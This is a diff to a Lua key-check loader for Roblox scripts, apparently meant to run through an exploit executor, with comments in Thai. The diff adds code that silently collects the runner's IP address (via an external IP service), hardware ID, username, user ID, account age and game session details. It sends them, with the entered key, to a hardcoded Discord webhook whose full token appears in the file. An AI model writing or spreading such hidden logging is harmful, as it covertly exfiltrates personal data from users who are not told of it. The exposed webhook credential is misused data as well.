@@ -1,5 +1,7 @@
--- Simple Key Verification Loader
+-- Simple Key Verification Loader with Discord Webhook Logging
 -- ใช้งาน: script_key="YOUR_KEY_HERE"; loadstring(game:HttpGet("URL"))()
+
+local webhookURL = "https://discord.com/api/webhooks/1375147331980099594/5758wuuuL-84m7Vw1u1Ztvi9iqlR-40CbS0UtbCTt56fknqZauFZ62AVZ27EX8xvGd2c"
 
 -- ตรวจสอบว่าผู้ใช้ใส่ script_key หรือไม่
 if not script_key then
@@ -15,6 +17,98 @@ local function getHWID()
         hwid = game:GetService("RbxAnalyticsService"):GetClientId()
     end)
     return success and hwid or "UNKNOWN"
+end
+
+-- ฟังก์ชันดึงข้อมูลผู้เล่น
+local function getPlayerInfo()
+    local player = game:GetService("Players").LocalPlayer
+    local playerInfo = {
+        username = player and player.Name or "Unknown",
+        displayName = player and player.DisplayName or "Unknown",
+        userId = player and tostring(player.UserId) or "Unknown",
+        accountAge = player and tostring(player.AccountAge) or "Unknown"
+    }
+    return playerInfo
+end
+
+-- ฟังก์ชันดึง IP (ผ่าน API ภายนอก)
+local function getIPAddress()
+    local success, ip = pcall(function()
+        local response = game:HttpGet("https://api.ipify.org?format=text")
+        return response
+    end)
+    return success and ip or "Unknown"
+end
+
+-- ฟังก์ชันดึงข้อมูลเกม
+local function getGameInfo()
+    return {
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown Game",
+        gameId = tostring(game.PlaceId),
+        jobId = game.JobId
+    }
+end
+
+-- ฟังก์ชันส่งข้อมูลไป Discord Webhook
+local function sendToWebhook(status, key, hwid, playerInfo, ip, gameInfo, message)
+    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    
+    local embed = {
+        title = status == "success" and "✅ Script Executed Successfully" or "❌ Script Execution Failed",
+        color = status == "success" and 65280 or 16711680, -- Green for success, Red for failure
+        fields = {
+            {
+                name = "🔑 Key Used",
+                value = "```" .. key .. "```",
+                inline = true
+            },
+            {
+                name = "💻 HWID",
+                value = "```" .. hwid .. "```",
+                inline = true
+            },
+            {
+                name = "🌐 IP Address",
+                value = "```" .. ip .. "```",
+                inline = true
+            },
+            {
+                name = "👤 Player Info",
+                value = "**Username:** " .. playerInfo.username .. 
+                       "\n**Display Name:** " .. playerInfo.displayName ..
+                       "\n**User ID:** " .. playerInfo.userId ..
+                       "\n**Account Age:** " .. playerInfo.accountAge .. " days",
+                inline = false
+            },
+            {
+                name = "🎮 Game Info",
+                value = "**Game:** " .. gameInfo.gameName ..
+                       "\n**Place ID:** " .. gameInfo.gameId ..
+                       "\n**Job ID:** " .. gameInfo.jobId,
+                inline = false
+            },
+            {
+                name = "📋 Status Message",
+                value = "```" .. message .. "```",
+                inline = false
+            }
+        },
+        timestamp = timestamp,
+        footer = {
+            text = "Script Logger System"
+        }
+    }
+    
+    local payload = {
+        username = "Script Logger",
+        avatar_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png",
+        embeds = {embed}
+    }
+    
+    pcall(function()
+        local jsonPayload = game:GetService("HttpService"):JSONEncode(payload)
+        game:HttpPost(webhookURL, jsonPayload, Enum.HttpContentType.ApplicationJson)
+    end)
 end
 
 -- ฟังก์ชันตรวจสอบ Key และ HWID
@@ -59,7 +153,13 @@ end
 print("🔍 กำลังตรวจสอบ Key: " .. script_key)
 
 local userHWID = getHWID()
+local playerInfo = getPlayerInfo()
+local ipAddress = getIPAddress()
+local gameInfo = getGameInfo()
+
 print("💻 HWID ของคุณ: " .. userHWID)
+print("👤 ผู้เล่น: " .. playerInfo.username)
+print("🌐 IP: " .. ipAddress)
 
 local isValid, message = verifyKeyAndHWID(script_key, userHWID)
 
@@ -67,17 +167,26 @@ if isValid then
     print(message)
     print("🚀 กำลังโหลด Script หลัก...")
     
+    -- ส่งข้อมูลไป Discord (สำเร็จ)
+    sendToWebhook("success", script_key, userHWID, playerInfo, ipAddress, gameInfo, "Script executed successfully")
+    
     -- โหลด script จริงที่นี่
     local mainScriptSuccess = pcall(function()
-        print("DONE")
+        -- เปลี่ยน URL ตรงนี้เป็น script หลักของคุณ
+        -- loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/main_script.lua"))()
+        print("DONE - Script หลักถูกโหลดแล้ว")
     end)
     
     if mainScriptSuccess then
         print("✅ โหลด Script สำเร็จ!")
     else
         warn("❌ เกิดข้อผิดพลาดในการโหลด Script หลัก")
+        sendToWebhook("failure", script_key, userHWID, playerInfo, ipAddress, gameInfo, "Failed to load main script")
     end
 else
     warn(message)
     warn("🔑 หากต้องการลงทะเบียน Key ใหม่ ให้ติดต่อแอดมิน")
+    
+    -- ส่งข้อมูลไป Discord (ล้มเหลว)
+    sendToWebhook("failure", script_key, userHWID, playerInfo, ipAddress, gameInfo, message)
 end
